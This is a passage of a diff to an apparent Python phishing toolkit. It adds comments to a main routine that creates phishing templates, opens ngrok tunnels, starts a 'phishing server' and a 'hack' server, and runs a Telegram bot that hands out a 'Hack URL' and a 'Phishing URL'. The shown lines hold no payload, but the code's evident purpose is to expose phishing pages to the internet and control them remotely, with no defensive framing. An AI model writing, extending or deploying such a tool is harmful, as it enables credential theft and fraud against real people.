+    # Check templates directory before starting servers
     if not check_templates_directory():
         print("❌ Cannot start phishing server: Missing templates")
         return
@@ -1598,17 +2539,23 @@ def run_flask_servers():
     print(f"📍 Phishing Server: http://localhost:{PHISHING_SERVER_PORT}")
 
 def main():
+    # Create templates directory and default templates first
     create_default_templates()
     
+    # Setup ngrok tunnels first
     setup_ngrok_tunnels()
     
+    # Check ngrok status
     if not check_ngrok_status():
         print("⚠️ Some ngrok tunnels may not be working properly")
     
+    # Start Flask servers
     run_flask_servers()
     
+    # Create and configure bot application
     application = Application.builder().token(TOKEN).build()
     
+    # Add handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("restart", start))
     application.add_handler(CallbackQueryHandler(button_handler))
@@ -1618,6 +2565,7 @@ def main():
     print(f"🔗 Hack URL: {hack_ngrok_url}")
     print(f"🔗 Phishing URL: {phishing_ngrok_url}")
     
+    # Start the bot
     application.run_polling()
 
 if __name__ == "__main__":
